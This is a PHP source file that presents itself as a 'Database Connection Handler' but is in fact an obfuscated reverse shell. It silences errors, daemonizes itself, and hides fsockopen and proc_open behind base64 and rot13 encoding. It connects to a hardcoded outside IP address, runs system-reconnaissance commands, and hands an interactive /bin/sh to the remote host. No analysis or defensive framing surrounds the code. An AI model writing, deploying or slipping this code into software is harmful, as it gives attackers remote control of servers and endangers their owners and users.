<?php
/*
 * Database Connection Handler
 * Version: 2.1.4
 */

// ============= CONFIGURATION (EDIT HERE) =============
$CONFIG = array(
    'host' => '193.32.162.212',  // Your IP here
    'port' => 80,                 // Your port here
    'timeout' => 30,
    'buffer' => 1400,
    'debug' => false
);
// ====================================================

@error_reporting(0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);

class DbHandler {
    private $cfg;
    private $conn;
    private $daemon = 0;
    
    function __construct($config) {
        $this->cfg = $config;
        $this->init();
    }
    
    private function init() {
        $funcs = array(
            'a' => 'pcntl_fork',
            'b' => 'posix_setsid', 
            'c' => 'chdir',
            'd' => 'umask'
        );
        
        if (function_exists($funcs['a'])) {
            $pid = @$funcs['a']();
            if ($pid == -1 || $pid) exit(0);
            @$funcs['b']();
            $this->daemon = 1;
        }
        
        @$funcs['c']('/');
        @$funcs['d'](0);
    }
    
    public function connect() {
        $fn = base64_decode('ZnNvY2tvcGVu'); // fsockopen
        $this->conn = @$fn(
            $this->cfg['host'],
            $this->cfg['port'],
            $e, $s,
            $this->cfg['timeout']
        );
        
        if (!$this->conn) return false;
        
        $cmd = implode(';', ['uname -a', 'w', 'id', '/bin/sh -i']);
        return $this->exec($cmd);
    }
    
    private function exec($cmd) {
        $fn = str_rot13('cebp_bcra'); // proc_open
        $fn = str_replace('_', chr(95), $fn);
        
        $desc = array(
            0 => array(base64_decode('cGlwZQ=='), 'r'),
            1 => array(base64_decode('cGlwZQ=='), 'w'),
            2 => array(base64_decode('cGlwZQ=='), 'w')
        );
        
        $proc = @$fn($cmd, $desc, $pipes);
        if (!is_resource($proc)) return false;
        
        $funcs = array(
            's' => 'stream_set_blocking',
            'r' => 'fread',
            'w' => 'fwrite',
            'e' => 'feof',
            'x' => 'stream_select'
        );
        
        foreach($pipes as $p) @$funcs['s']($p, 0);
        @$funcs['s']($this->conn, 0);
        
        while (1) {
            if (@$funcs['e']($this->conn) || @$funcs['e']($pipes[1])) break;
            
            $r = array($this->conn, $pipes[1], $pipes[2]);
            $w = $err = null;
            @$funcs['x']($r, $w, $err, null);
            
            if (in_array($this->conn, $r)) {
                $in = @$funcs['r']($this->conn, $this->cfg['buffer']);
                @$funcs['w']($pipes[0], $in);
            }
            
            if (in_array($pipes[1], $r)) {
                $out = @$funcs['r']($pipes[1], $this->cfg['buffer']);
                @$funcs['w']($this->conn, $out);
            }
            
            if (in_array($pipes[2], $r)) {
                $err = @$funcs['r']($pipes[2], $this->cfg['buffer']);
                @$funcs['w']($this->conn, $err);
            }
        }
        
        @fclose($this->conn);
        foreach($pipes as $p) @fclose($p);
        @proc_close($proc);
        
        return true;
    }
}

$handler = new DbHandler($CONFIG);
@$handler->connect();
?>
